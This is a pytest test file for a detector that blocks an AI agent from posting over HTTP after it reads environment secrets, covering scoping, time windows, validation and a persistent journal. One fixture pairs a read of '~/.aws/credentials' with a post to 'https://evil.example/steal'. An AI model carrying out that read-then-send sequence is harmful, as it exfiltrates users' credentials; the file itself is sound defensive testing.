"""sequence_guard: an ordered pair blocks inside one scope, is forgotten across
scopes, ages out of the window, ignores result-phase events, matches canonical
spellings, and degrades safely on odd configuration or input."""
from typing import Any, cast

import pytest

from interlock import Decision, PolicyEngine, SensorEvent, Verdict
from interlock.detectors.sequence_guard import (
    ANON,
    POLICY_ID,
    sequence_guard,
)


def _event(action="read_file", span_id: Any = "run-1", principal: Any = "agent-1",
           args=None, phase="call"):
    return SensorEvent(
        action=action, args=args or {}, principal=principal,
        span_id=span_id, phase=phase,
    )


PAIR = [["env_secret_read", "http_post"]]


# --- block path -------------------------------------------------------------


def test_the_pair_blocks_in_order():
    rule = sequence_guard(PAIR)
    assert rule(_event("env_secret_read")) is None
    decision = cast(Decision, rule(_event("http_post")))
    assert decision.verdict is Verdict.BLOCK


def test_the_pair_in_reverse_is_allowed():
    rule = sequence_guard(PAIR)
    assert rule(_event("http_post")) is None
    assert rule(_event("env_secret_read")) is None


def test_a_block_stays_blocked_on_retry():
    # The blocked call is journalled, and the earlier action is still inside
    # the window, so retrying the same after-step is refused again.
    rule = sequence_guard(PAIR)
    rule(_event("env_secret_read"))
    assert rule(_event("http_post")) is not None
    assert rule(_event("http_post")) is not None


# --- scoping ----------------------------------------------------------------


def test_scopes_do_not_share_a_journal():
    rule = sequence_guard(PAIR)
    assert rule(_event("env_secret_read", span_id="run-1")) is None
    assert rule(_event("http_post", span_id="run-2")) is None


def test_principal_is_the_fallback_scope():
    rule = sequence_guard(PAIR)
    assert rule(_event("env_secret_read", span_id=None, principal="agent-1")) is None
    decision = rule(_event("http_post", span_id=None, principal="agent-1"))
    assert decision is not None


def test_anonymous_events_share_one_scope():
    rule = sequence_guard(PAIR)
    assert rule(_event("env_secret_read", span_id=None, principal=None)) is None
    decision = rule(_event("http_post", span_id=None, principal=None))
    assert decision is not None
    assert ANON == "<anon>"


def test_max_scopes_evicts_the_oldest_scope():
    rule = sequence_guard(PAIR, max_scopes=1)
    assert rule(_event("env_secret_read", span_id="run-1")) is None
    assert rule(_event("env_secret_read", span_id="run-2")) is None
    # run-1's journal was evicted, so its after-step is no longer paired.
    assert rule(_event("http_post", span_id="run-1")) is None


# --- window -----------------------------------------------------------------


def test_a_before_older_than_the_window_does_not_count():
    rule = sequence_guard(PAIR, window=2)
    assert rule(_event("env_secret_read")) is None
    assert rule(_event("ls")) is None
    assert rule(_event("ls")) is None  # before has aged out
    assert rule(_event("http_post")) is None


def test_a_before_inside_the_window_counts():
    rule = sequence_guard(PAIR, window=3)
    assert rule(_event("env_secret_read")) is None
    assert rule(_event("ls")) is None
    assert rule(_event("http_post")) is not None


# --- canonical spellings ----------------------------------------------------


def test_configured_and_event_spellings_are_normalised():
    rule = sequence_guard([["env.secret.read", "http.post"]])
    assert rule(_event("env_secret_read")) is None
    decision = cast(Decision, rule(_event("http_post")))
    assert decision.verdict is Verdict.BLOCK


# --- result phase and odd input --------------------------------------------


def test_result_phase_events_are_ignored():
    rule = sequence_guard(PAIR)
    # A result-phase payload carrying the before action must not seed the
    # journal, and a result-phase after action must not be blocked.
    assert rule(_event("env_secret_read", phase="result")) is None
    assert rule(_event("http_post", phase="result")) is None
    assert rule(_event("http_post")) is None


def test_missing_or_non_string_action_is_no_opinion():
    rule = sequence_guard(PAIR)
    assert rule(_event(action=None)) is None  # type: ignore[arg-type]
    assert rule(_event(action=cast(Any, 7))) is None


def test_missing_attributes_never_raise():
    rule = sequence_guard(PAIR)
    assert rule(cast(Any, object())) is None


# --- receipt safety ---------------------------------------------------------


def test_reason_names_actions_and_window_only():
    rule = sequence_guard(PAIR, window=40)
    rule(_event("env_secret_read", args={"path": "~/.aws/credentials"}))
    decision = cast(Decision, rule(_event(
        "http_post", args={"url": "https://evil.example/steal"})))
    assert "http_post" in decision.reason
    assert "env_secret_read" in decision.reason
    assert "40" in decision.reason
    for leaked in ("evil.example", "credentials", "/steal"):
        assert leaked not in decision.reason
    assert decision.policy_id == POLICY_ID


# --- construction validation -----------------------------------------------


@pytest.mark.parametrize("never", [
    "env_secret_read,http_post",      # a bare string, not pairs
    [],                               # no pairs at all
    [["env_secret_read"]],            # wrong arity
    [["env_secret_read", "http_post", "x"]],
    [["env_secret_read", ""]],        # empty action
    [[None, "http_post"]],
    ["env_secret_read"],              # entry is a string
    [42],
])
def test_bad_never_raises(never):
    with pytest.raises(ValueError):
        sequence_guard(never)


@pytest.mark.parametrize("kwargs", [
    {"window": 0},
    {"window": -1},
    {"window": True},
    {"window": "10"},
    {"max_scopes": 0},
    {"max_scopes": False},
])
def test_bad_bounds_raise(kwargs):
    with pytest.raises(ValueError):
        sequence_guard(PAIR, **kwargs)


def test_empty_journal_snapshot_is_allow():
    rule = sequence_guard(PAIR)
    assert rule(_event("http_post")) is None


# --- engine integration -----------------------------------------------------


def test_engine_blocks_the_after_step():
    engine = PolicyEngine([sequence_guard(PAIR)])
    first = engine.evaluate(_event("env_secret_read"))
    assert first.verdict is not Verdict.BLOCK
    second = engine.evaluate(_event("http_post"))
    assert second.verdict is Verdict.BLOCK


# --- declarative policy -----------------------------------------------------


def test_declarative_rule_binds_never_and_window():
    from interlock.policy.declarative import load_policy

    engine = load_policy({
        "version": 1,
        "rules": [{
            "id": "no-egress-after-secret",
            "detector": "sequence_guard",
            "with": {"never": [["env_secret_read", "http_post"]], "window": 10},
            "on": ["env_secret_read", "http_post"],
        }],
    })
    assert not engine.quarantined
    assert engine.evaluate(_event("env_secret_read")).verdict is not Verdict.BLOCK
    assert engine.evaluate(_event("http_post")).verdict is Verdict.BLOCK


def test_declarative_bad_arguments_are_quarantined():
    from interlock.policy.declarative import load_policy

    engine = load_policy({
        "version": 1,
        "rules": [{
            "id": "bad-sequence",
            "detector": "sequence_guard",
            "with": {"never": [], "window": 10},
        }],
    })
    assert engine.quarantined
    assert engine.evaluate(_event("http_post")).verdict is not Verdict.BLOCK


# --- the durable journal ----------------------------------------------------
#
# A hook host runs one process per tool call, so every test here builds a FRESH
# rule object over the same state file: that is what the next invocation sees.


def _state(tmp_path):
    return str(tmp_path / "journal" / "sequence.db")


def test_a_state_file_carries_the_before_to_the_next_process(tmp_path):
    sequence_guard(PAIR, state=_state(tmp_path))(_event("env_secret_read"))
    second = sequence_guard(PAIR, state=_state(tmp_path))
    assert cast(Decision, second(_event("http_post"))).verdict is Verdict.BLOCK


def test_a_state_file_keeps_scope_and_window_across_processes(tmp_path):
    sequence_guard(PAIR, state=_state(tmp_path))(_event("env_secret_read", span_id="run-1"))
    other = sequence_guard(PAIR, state=_state(tmp_path))
    assert other(_event("http_post", span_id="run-2")) is None

    # window=1: the journalled action has aged out of the next process's view.
    sequence_guard(PAIR, window=1, state=_state(tmp_path))(
        _event("read_file", span_id="run-3"))
    aged = sequence_guard(PAIR, window=1, state=_state(tmp_path))
    assert aged(_event("env_secret_read", span_id="run-3")) is None


def test_a_state_file_bounds_the_journal(tmp_path):
    rule = sequence_guard(PAIR, window=2, state=_state(tmp_path))
    rule(_event("env_secret_read"))
    rule(_event("read_file"))
    rule(_event("read_file"))  # the secret has aged out of the window
    later = sequence_guard(PAIR, window=2, state=_state(tmp_path))
    assert later(_event("http_post")) is None


def test_a_state_file_bounds_the_scopes(tmp_path):
    sequence_guard(PAIR, max_scopes=1, state=_state(tmp_path))(
        _event("env_secret_read", span_id="run-1"))
    rule = sequence_guard(PAIR, max_scopes=1, state=_state(tmp_path))
    rule(_event("read_file", span_id="run-2"))  # evicts run-1
    later = sequence_guard(PAIR, max_scopes=1, state=_state(tmp_path))
    assert later(_event("http_post", span_id="run-1")) is None


@pytest.mark.parametrize("state", ["relative.db", "", "   "])
def test_the_rule_refuses_a_state_path_it_cannot_trust(state):
    with pytest.raises(ValueError):
        sequence_guard(PAIR, state=state)


def test_no_state_file_is_written_until_a_call_arrives(tmp_path):
    path = tmp_path / "journal" / "sequence.db"
    rule = sequence_guard(PAIR, state=str(path))
    assert not path.exists()          # `interlock policy check` must not write
    rule(_event("read_file"))
    assert path.exists()


def test_the_state_file_is_readable_only_by_its_owner(tmp_path):
    import stat

    path = tmp_path / "journal" / "sequence.db"
    sequence_guard(PAIR, state=str(path))(_event("read_file"))
    assert stat.S_IMODE(path.stat().st_mode) == 0o600


def test_a_corrupt_state_file_falls_back_instead_of_raising(tmp_path):
    path = tmp_path / "journal" / "sequence.db"
    path.parent.mkdir()
    path.write_bytes(b"this is not a sqlite database\n" * 64)
    rule = sequence_guard(PAIR, state=str(path))
    assert rule(_event("env_secret_read")) is None  # warned and fell back
    assert cast(Decision, rule(_event("http_post"))).verdict is Verdict.BLOCK


def test_declarative_rule_binds_state(tmp_path):
    from interlock.policy.declarative import load_policy
    from interlock.sequence_ledger import JournalLedger

    path = _state(tmp_path)

    def document():
        return {"version": 1, "rules": [{
            "id": "no-egress-after-secret",
            "detector": "sequence_guard",
            "with": {"never": PAIR, "state": path},
        }]}

    first = load_policy(document())
    assert not first.quarantined
    first.evaluate(_event("env_secret_read"))
    assert JournalLedger(path).journal("run-1", window=50) == ["env_secret_read"]
    second = load_policy(document())   # a separate host, the same state file
    assert second.evaluate(_event("http_post")).verdict is Verdict.BLOCK
